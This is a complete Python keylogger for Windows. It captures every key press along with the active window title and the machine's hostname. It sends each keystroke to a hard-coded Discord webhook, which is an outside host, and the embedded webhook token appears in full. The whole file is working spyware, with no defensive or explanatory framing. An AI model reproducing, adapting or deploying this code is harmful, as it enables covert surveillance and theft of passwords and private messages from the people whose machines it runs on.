import keyboard
import requests
import win32gui
import socket
import json

DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1098878299473707060/prAl_xOch--1mHMAoKK8PHIeVCuw6tWCrXsziuvvkUK8sK6oVQFosCnN1zO8Atxp3f0T'
hostname = socket.gethostname()

def send_to_discord_webhook(message):
    
    payload = {
        'content': message
    }
    headers = {
        'Content-Type': 'application/json'
    }
    response = requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(payload), headers=headers)
    if response.status_code != 204:
        print(f'Failed to send message to Discord webhook: {response.content}')

def on_key_press(event):
    window = win32gui.GetForegroundWindow()
    title = win32gui.GetWindowText(window)
    if event.event_type == 'down':
        message = f'Key pressed: <{event.name}>  { hostname}   {title}'
        print(message)
        send_to_discord_webhook(message)

keyboard.on_press(on_key_press)


keyboard.wait()
